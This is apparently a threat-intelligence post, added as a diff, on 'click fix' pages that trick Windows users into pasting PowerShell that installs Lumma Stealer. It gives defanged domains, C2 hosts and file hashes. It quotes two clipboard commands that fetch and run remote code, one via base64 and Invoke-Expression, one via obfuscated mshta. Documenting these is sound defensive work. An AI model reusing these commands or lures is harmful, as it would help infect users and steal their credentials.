@@ -1,0 +1,134 @@
+2025-03-05 (WEDNESDAY): "CLICK FIX" STYLE DISTRIBUTION OF LUMMA STEALER
+
+AUTHOR:
+
+- Billy Melicher
+
+NOTES:
+
+- Campaigns continue using "click fix" style distribution tactics to distribute Lumma Stealer malware.
+- "Click fix" refers to web pages that insert malicious script into the copy/paste buffer.
+- These pages show detailed instructions for users to open a run window, paste the script into the window and run it.
+- Tactics used in these campaigns continue evolving as attackers attempt to evade detection.
+- These evolving tactics include:
+  -- Registering domain names that mimic domain names used by legitimate services.
+  -- Impersonating different legitimate services to convince users to paste malicious script into a run window.
+  -- Also abusing legitimate services like Google Sites to host these malicious pages.
+  -- Using data binaries that contain a combination of text binary data that execute as PowerShell script.
+  -- Using zip archives that contain decoy files and a legitimate EXE to side-load a Lumma Stealer DLL.
+
+- This post contains some recent indicators and two examples of malicious pages impersonating legitimate services.
+
+RECENT INDICATORS:
+
+ACTIVE DOMAIN AND URL HOSTING PAGES IMPERSONATING LEGITIMATE SERVICES:
+
+- windows-update[.]site  <-- site active, domain registered on 2025-02-19
+- sites[.]google[.]com/view/get-access-now-test/verify-your-account
+
+OTHER DOMAINS ASSOCIATED WITH THIS CAMPAIGN:
+
+(Read: date registered: domain name)
+
+- 2025-01-17: authentication-safeguard[.]com
+- 2025-02-09: bigcatllover123[.]cfd
+- 2025-01-06: distribution-berachain[.]net
+- 2024-12-02: distribution-hyperfoundation[.]net
+- 2025-02-20: overcoatpassably[.]shop
+- 2025-03-01: plsverif[.]cfd
+- 2025-02-27: tlgrm-redirect[.]icu
+- 2025-01-11: tlgrmverif[.]cyou
+
+---------------------------------------------------
+EXAMPLE 1 OF 2 (DLL SIDE-LOADING FOR LUMMA STEALER):
+---------------------------------------------------
+
+URL FOR FAKE GOOGLE MEET PAGE:
+
+- hxxps[:]//sites.google[.]com/view/get-access-now-test/verify-your-account
+
+EXAMPLE OF POWERSHELL COMMAND SENT TO COPY/PASTE BUFFER FOR VICTIM TO PASTE INTO RUN WINDOW:
+
+- powershell -w hidden -c $a='[base64 text removed]';
+  $b=[Convert]::FromBase64String($a);$c=[System.Text.Encoding]::
+  UTF8.GetString($b);Invoke-Expression (Invoke-WebRequest -Uri $c).Content 
+  #⠀⠀⠀⠀⠀⠀Audio Driver Updater 4.7X  - (Build 2025.01.12)⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+
+URL FROM THE ABOVE BASE64 TEXT:
+
+- hxxps[:]//tlgrm-redirect[.]icu/1.txt
+
+TRAFFIC LEADING TO LUMMA STEALER INFECTION:
+
+- https[:]//ipinfo[.]io/json  <-- not malicious, IP address check caused by infection process
+- https[:]//tlgrmverif[.]cyou/log.php  <-- HTTP POST data confirming 1.txt script started executing
+- https[:]//plsverif[.]cfd/1.zip  <-- returned zip archive containing files for Lumma Stealer
+- https[:]//tlgrmverif[.]cyou/log.php  <-- HTTP POST data confirming zip download successful
+- https[:]//tlgrmverif[.]cyou/log.php  <-- HTTP POST data confirming successful extraction of zip archive contents
+- https[:]//tlgrmverif[.]cyou/log.php  <-- HTTP POST data confirming EXE file from zip archive ran successfully
+
+ACTIVE LUMMA STEALER C2 DOMAINS:
+
+- web-security3[.]com
+- codxefusion[.]top
+- techspherxe[.]top
+- farmingtzricks[.]top
+
+INACTIVE LUMMA STEALER C2 DOMAINS THAT DID NOT RESOLVE TO AN IP ADDRESS:
+
+- hardswarehub[.]today
+- gadgethgfub[.]icu
+- hardrwarehaven[.]run
+- techmindzs[.]live
+- quietswtreams[.]life
+- earthsymphzony[.]today
+
+-ASSOCIATED MALWARE:
+
+- SHA256 hash: 909ed8a1351f9a21ebdd5d8efb4147145f12d5d24225dbd44cd2800a1f94a596
+- File size: 4,958 bytes
+- File location: hxxps[:]//tlgrm-redirect[.]icu/1.txt
+- File type: UTF-8 Unicode text, with CRLF line terminators
+- File description: PowerShell script retrieved and run by copy/pasted PowerShell command
+
+ SHA256 hash: 0608775a345c5a0869418ffddd1f694cb888fe8acde6d34543516db1a01e3ef8
+- File size: 7,714,905 bytes
+- File location: hxxps[:]//plsverif[.]cfd/1.zip
+- File location: C:\Users\[username]\AppData\Local\Temp\download.zip
+- File type: Zip archive data, at least v2.0 to extract
+- File description: Zip archive containing files for Lumma Stealer retrieved by Powershell script
+
+- SHA256 hash: b3e8b610efc0eef57332e50c29b54b0da5f497de1452d5e178009a0f354d7058
+- File size: 881,144 bytes
+- File location: C:\Users\[username]\AppData\Local\Temp\extract\DuiLib_u.dll
+- File type: PE32 executable (DLL) (GUI) Intel 80386, for MS Windows
+- File description: DLL for Lumma Stealer side-loaded by legitimate EXE, both from the above zip archive
+
+---------------------------------------------------
+EXAMPLE 2 OF 2 (DLL SIDE-LOADING FOR LUMMA STEALER):
+---------------------------------------------------
+
+FAKE WINDOWS UPDATE SITE:
+
+- hxxps[:]//windows-update[.]site/
+
+EXAMPLE OF POWERSHELL COMMAND SENT TO COPY/PASTE BUFFER FOR VICTIM TO PASTE INTO RUN WINDOW:
+
+- powershell -w 1 powershell -Command ('ms]]]ht]]]a]]].]]]exe [malicious URL removed]'  -replace ']')
+  # ✅ ''I am not a robot - reCAPTCHA Verification ID: 8646''
+
+URL FROM THE ABOVE POWERSHELL COMMAND:
+
+- hxxps[:]//overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy[.]mp4
+
+FOLLOW-UP TRAFFIC:
+
+- hxxps[:]//tib.cdn-serveri2345-ns[.]shop/foppish.xll  <-- response: 404 not found
+
+ASSOCIATED FILE:
+
+- SHA256 hash: 15c80b5be235bf2a8c38291eb697a702c07dde087eb459e9ea46a2bee17c5f03
+- File size: 2,461,812 bytes
+- File location: hxxps[:]//overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy[.]mp4
+- File type: data
+- File description: combination of ASCII text and binary data that can be run as PowerShell script
